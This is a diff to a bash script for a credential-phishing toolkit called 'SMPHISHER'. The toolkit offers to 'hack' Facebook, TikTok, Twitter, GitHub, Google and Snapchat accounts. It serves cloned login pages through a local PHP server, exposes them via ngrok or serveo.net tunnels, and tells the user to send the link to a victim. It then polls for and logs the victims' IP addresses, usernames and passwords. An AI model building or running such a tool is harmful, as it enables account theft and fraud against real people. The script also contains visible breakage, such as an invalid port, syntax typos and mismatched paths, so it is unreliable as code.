@@ -14,7 +14,7 @@ dependencies() {
 command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
 command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
-command -v openssh > /dev/null 2>&1 || { echo >&2 "I require openssh but it's not installed. Install it. Aborting."; exit 1; }
+command -v figlet > /dev/null 2>&1 || { echo >&2 "I require figlet but it's not installed. Install it. Aborting."; exit 1; }
  
 
 }
@@ -25,12 +25,18 @@ command -v openssh > /dev/null 2>&1 || { echo >&2 "I require openssh but it's no
 
 main_menu() {
 
-echo "01"
-echo "02"
-echo "03"
-echo "04"
-echo "05"
-echo "06"
+figlet SMPHISHER
+echo -e $red $=================================$
+echo -e $red $    CODED BY PRINCE GUTIERREZ    $
+echo -e $red $=================================$
+echo -e $red ==================================
+echo -e $red % "[01]    FACEBOOK               %
+echo -e $red % "[02]    TIKTOK                 %
+echo -e $red % "[03]    TWITTER                %
+echo -e $red % "[04]    GITHUB                 %
+echo -e $red % "[05]    GOOGLE                 %
+echo -e $red % "[06]    SNAPCHAT               %
+echo -e $red ==================================                              
 read -p $red "ENTER SOCIAL MEDIA TO HACK " hug
 
 if [[ $hug == 1 || $hug == 01 ]]; then
@@ -60,34 +66,14 @@ fi
 
 }
 
-
-checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
-checkphp=$(ps aux | grep -o "php" | head -n1)
-checkssh=$(ps aux | grep -o "ssh" | head -n1)
-if [[ $checkngrok == *'ngrok'* ]]; then
-pkill -f -2 ngrok > /dev/null 2>&1
-killall -2 ngrok > /dev/null 2>&1
-fi
-
-if [[ $checkphp == *'php'* ]]; then
-killall -2 php > /dev/null 2>&1
-fi
-if [[ $checkssh == *'ssh'* ]]; then
-killall -2 ssh > /dev/null 2>&1
-fi
-exit 1
-
-}
-
 ngrok_server() {
-
-
 if [[ -e ngrok ]]; then
 echo ""
 else
 command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
 command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
-                             
+printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
+printf "\e[1;92m[\e[0m+\e[1;92m] Please Wait...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
@@ -117,99 +103,190 @@ fi
 
 }
 
-## Setup website and start php server
-HOST='127.0.0.1'
-PORT='8080'
+stop() {
 
-setup_site() {
-	echo -e $red  SETTING NOW SERVER
-	cp -rf sites/"$website"/* .server/www
-	cp -f sites/ip.php .server/www/
-	echo -e STARING NOW PHP SERVER
-	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
-}
-
-## Get IP address
-capture_ip() {
-	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
-	IFS=$'\n'
-	echo -e $red VICTIM PASSWORD FOUND $IP"
-	echo -e $red Saved in : pass.txt"
-	cat .server/www/pass.txt >> pass.txt
-}
-
-## Get credentials
-capture_creds() {
-	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
-	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
-	IFS=$'\n'
-	echo -e $red Account : $ACCOUNT"
-	echo -e $red Password : $PASSWORD"
-	echo -e $red Saved in : usernames.txt"
-	cat .server/www/usernames.txt >> usernames.txt
-	echo -e $red Waiting for Next Login Info, $blueCtrl + C $green to exit. "
-}
-
-## Print data
-capture_data() {
-	echo -e $red Waiting for Login Info, $blue Ctrl + C $white to exit..."
-	while true; do
-		if [[ -e ".server/www/pass.txt" ]]; then
-			echo -e $red Victim IP Found !"
-			capture_ip
-			rm -rf .server/www/ip.txt
-		fi
-		sleep 0.75
-		if [[ -e ".server/www/usernames.txt" ]]; then
-			echo -e $red Login info Found !!"
-			capture_creds
-			rm -rf .server/www/usernames.txt
-		fi
-		sleep 0.75
-	done
-}
-
-## Start ngrok
-echo -e $red initializing... http://$HOST:$PORT
-sleep 1
-cd sites/www && php -S $HOST:$PORT > /dev/null 2>&1 & 
-sleep 2
-sites/ngrok http $HOST:$PORT > /dev/null 2>&1 &
-sleep 7
-ngrok_link=$(curl -s -N $HOST:$PORT | grep -o "https://[0-9a-z]*\.ngrok.io")
-echo -e $red SENDING LINK : $ngrok_link
+checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
+checkphp=$(ps aux | grep -o "php" | head -n1)
+checkssh=$(ps aux | grep -o "ssh" | head -n1)
+if [[ $checkngrok == *'ngrok'* ]]; then
+pkill -f -2 ngrok > /dev/null 2>&1
+killall ngrok > /dev/null 2>&1
+fi
+if [[ $checkphp == *'php'* ]]; then
+pkill -f -2 php > /dev/null 2>&1
+killall php > /dev/null 2>&1
+fi
+if [[ $checkssh == *'ssh'* ]]; then
+pkill -f -2 ssh > /dev/null 2>&1
+killall ssh > /dev/null 2>&1
+fi
+if [[ -e .sp ]]; then
+rm -rf .sp
+fi
 
 }
 
-## Start localhost
-start_localhost() {
-	echo -e $red READING SERVER... $red http://$HOST:$PORT"
-	setup_site
-	echo -e $red Successfully Host : $red http://$HOST:$PORT $red"
-	capture_data
-}
-
-### Tunnel selection
 tunnel_menu() {
 
-echo -e $red "[01]   >	  Localhost"
-echo -e $red "[02]   >    Ngrok"
+if [[ -e .sp ]]; then
+rm -rf .sp
+fi
 
-	EOF
+if [[ -d .htr/www ]]; then
+rm -rf .pd/www
+mkdir .pd/www
+else
+mkdir .pd/www
+fi
 
-	read -p " Select a port forwarding service : " REPLY
+cp -rf sites/$website/* .pd/www
+cp -f sites/ip.php .pd/www/
 
-	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
-		start_localhost
-	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
-		start_ngrok
-	else
-		echo -e $blue Invalid Option, Try Again..."
-		sleep 1 
-                tunnel_menu 
-	fi
+def_tunnel_menu="2"
+figlet SMPHISHER
+fi
+
+start_ngrok() {
+
+echo -e $red Reading now... http://127.0.0.1:972742
+sleep 2
+echo -e $red Ngrok Launching Up ...
+cd pd/www && php -S http://127.0.0.1:972742 > /dev/null 2>&1 & 
+sleep 2
+./pd/ngrok http http://127.0.0.1:972742 > /dev/null 2>&1 &
+sleep 7
+ngrok_link=$(curl -s -N http://127.0.0.1:972742/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+
+figlet SMPHISHER
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+% SEND THIS HACKING LINK TO THE VICTIM👇👇👇👇👇 % 
+% LINK $ngrok_link                               %
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+datafound
+}
+
+start_serveo() {
+
+serveo_default_choose_sub="Y"
+serveo_default_sub="$website$RANDOM"
+serveo_def_port="5555"
+
+echo -e $red Select a Port $red Default : $serveo_def_port
+read serveo_port
+serveo_port="${serveo_port:-${serveo_def_port}}"
+sleep 1
+echo -e $red Generate Custom Link ? Y :
+read serveo_choose_sub
+serveo_choose_sub="${serveo_choose_sub:-${serveo_default_choose_sub}}"
+if [[ $serveo_choose_sub == "Y" || $serveo_choose_sub == "y" || $serveo_choose_sub == "Yes" || $serveo_choose_sub == "yes" ]]; then
+serveo_custom_subdomain=true
+sleep 1
+echo -e $red Input CUSTOM Subdomain : $redDefault: $red: $serveo_default_sub
+read serveo_subdomain
+serveo_subdomain="${serveo_subdomain:-${serveo_default_sub}}"
+sleep 1
+fi
+
+echo -e $res Starting.....http://127.0.0.1:$serveo_port
+sleep 1
+echo -e $red Launching Up Serveo ...
+cd pd/www && php -S 127.0.0.1:$serveo_port > /dev/null 2>&1 & 
+if [[ $serveo_custom_subdomain == true ]]; then
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R %s:80:localhost:%s serveo.net > .nexlink 2> /dev/null &' $serveo_subdomain,$serveo_port
+sleep 7
+
+else
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:%s serveo.net > .nexlink 2> /dev/null &' $serveo_port
+sleep 7
+fi
+serveo_link=$(grep -o '.\{0,0\}http.\{0,100\}' .nexlink)
+figlet SMPHISHER
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+% SEND THIS HACKING LINK TO THE VICTIM👇👇👇👇👇 % 
+% LINK $serveo_link                              %
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+datafound
+}
+
+
+echo -e $red [ $red ! $red ] Login Info 
+while [ true ]; d
+
+if [[ -e "pd/www/ip.txt" ]]; then
+echo -e $red [ $blue ! $red ] Victim IP Found 
+grab_ip
+rm -rf pd/www/ip.txt
+fi
+sleep 0.75
+if [[ -e ".htr/www/usernames.txt" ]]; then
+account=$(grep -o 'Username:.*' pd/www/usernames.txt | cut -d " " -f2)
+IFS=$'\n'
+password=$(grep -o 'Pass:.*' pd/www/usernames.txt | cut -d ":" -f2)
+echo -e $red Account: " $account
+echo -e $red Password:  $password
+cat pd/www/usernames.txt >> logs/$website.log
+$website
+printf "\n"
+echo -e $red Press Ctrl + C
+rm -rf pd/www/usernames.txt
+fi
+sleep 0.75
+
+done
+
+}
+
+grab_ip() {
+
+ip=$(grep -a 'IP:' pd/www/ip.txt | cut -d " " -f2 | tr -d '\r')
+IFS=$'\n'
+
+echo -e $red Victim IP: $ip
+echo -e $red Saved: ip.txt $server
+cat pd/www/ip.txt >> ip.txt
+
+}
+
+grab_creds() {
+
+account=$(grep -o 'Username:.*' pd/www/usernames.txt | cut -d " " -f2)
+IFS=$'\n'
+password=$(grep -o 'Pass:.*' pd/www/usernames.txt | cut -d ":" -f2)
+echo -e $red Account: $account
+echo -e $red Password: $password
+cat pd/www/usernames.txt >> logs/$website.log
+echo -e $red Saved: $website
+echo -e $red Waiting for Next Login Info $red Ctrl + C to exit
+
+}
+
+datafound() {
+
+echo -e $red Waiting for Login Info,$red Ctrl + C to exit.
+printf "\n"
+while [ true ]; do
+
+
+if [[ -e "pd/www/ip.txt" ]]; then
+echo -e $red Victim IP Found !
+grab_ip
+rm -rf pd/www/ip.txt
+fi
+sleep 0.75
+if [[ -e "pd/www/usernames.txt" ]]; then
+echo -e $red Login info Found !!
+grab_creds
+rm -rf pd/www/usernames.txt
+fi
+sleep 0.75
+
+
+done 
+
 }
 
 dependencies
 ngrok_server
-main_menu
+menu
